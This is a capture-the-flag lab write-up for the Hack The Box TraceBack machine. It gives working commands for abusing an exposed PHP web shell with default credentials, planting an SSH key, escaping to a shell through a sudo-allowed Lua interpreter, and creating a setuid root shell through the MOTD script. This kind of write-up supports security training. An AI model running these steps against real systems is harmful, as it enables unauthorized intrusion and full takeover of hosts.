# Target
| Category          | Details                                                    |
|-------------------|------------------------------------------------------------|
| 📝 **Name**       | [TraceBack](https://app.hackthebox.com/machines/TraceBack) |  
| 🏷 **Type**       | HTB Machine                                                |
| 🖥️ **OS**        | Linux                                                      |
| 🎯 **Difficulty** | Easy                                                       |

# Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.16 seconds
```

# Attack path
1. [Gain foothold by uploading SSH RSA key over exposed web shell](#gain-foothold-by-uploading-ssh-rsa-key-over-exposed-web-shell)
2. [Escalate to `sysadmin` user with LUA script executed with `sudo`](#escalate-to-sysadmin-user-with-lua-script-executed-with-sudo)
3. [Escalate to `root` user with root shell created in `/etc/update-motd.d/00-header`](#escalate-to-root-user-with-root-shell-created-in-etcupdate-motdd00-header)

### Gain foothold by uploading SSH RSA key over exposed web shell

#### Identify `SmEvK_PaThAn` web shell
HTML code of defaced page, `<!--Some of the best web shells that you might need ;)-->`, suggest web shell available.

```
┌──(magicrc㉿perun)-[~/attack/HTB TraceBack]
└─$ curl -I http://$TARGET/smevk.php
HTTP/1.1 200 OK
Date: Sun, 11 May 2025 10:02:07 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=ljpnkles31ol3a999ntpeq1lob; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

#### Generate RSA key pair
```
┌──(magicrc㉿perun)-[~/attack/HTB TraceBack]
└─$ ssh-keygen -t rsa -b 4096 -f id_rsa
Generating public/private rsa key pair.
Enter passphrase for "id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:on6KOOSdYl77YMTXtnmYsfpFwgIv8N92bUf2ghw6hgQ magicrc@perun
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|                 |
| . . E           |
|  + o +          |
|   = +.BS. . o   |
| .. +.=.@ + = .  |
|o .+o. X B = o . |
|.=o=o + = o . .  |
|+oo.+=..         |
+----[SHA256]-----+
```

#### Upload `is_rsa.pub` with web shell
```
┌──(magicrc㉿perun)-[~/attack/HTB TraceBack]
└─$ cp id_rsa.pub authorized_keys
curl -s -c cookies.txt http://$TARGET/smevk.php -d 'uname=admin&pass=admin' -o /dev/null && \
curl -s -b cookies.txt http://$TARGET/smevk.php -F "f=@authorized_keys;type=text/plain" -F "a=FilesMan" -F "c=/home/webadmin/.ssh/" -F "p1=uploadFile" -F "charset=UTF8" -F "filename=authorized_keys" -o /dev/null
```

#### Gain access over SSH using forged key
```
┌──(magicrc㉿perun)-[~/attack/HTB TraceBack]
└─$ ssh -i id_rsa webadmin@$TARGET
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Last login: Sun May 11 03:42:03 2025 from 10.10.14.161
webadmin@traceback:~$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

### Escalate to `sysadmin` user with LUA script executed with `sudo`
```
webadmin@traceback:~$ echo 'os.execute("/bin/sh")' > "pe.lua" && \
sudo -u sysadmin /home/sysadmin/luvit pe.lua
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
```

### Escalate to `root` user with root shell created in `/etc/update-motd.d/00-header`

#### Add root shell creation to `/etc/update-motd.d/00-header`
```
$ echo "/bin/cp /bin/bash /tmp/root_shell; /bin/chmod +s /tmp/root_shell" >> /etc/update-motd.d/00-header
```

#### Login as `webadmin` over SSH to generate root shell
```
┌──(magicrc㉿perun)-[~/attack/HTB TraceBack]
└─$ ssh -i id_rsa webadmin@$TARGET
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 11 04:06:56 2025 from 10.10.14.161
webadmin@traceback:~$ ls -la /tmp/root_shell
-rwsr-sr-x 1 root root 1113504 May 11 04:06 /tmp/root_shell
```

#### Execute root shell
```
webadmin@traceback:~$ /tmp/root_shell -p
root_shell-4.4# id
uid=1000(webadmin) gid=1000(webadmin) euid=0(root) egid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(webadmin)
```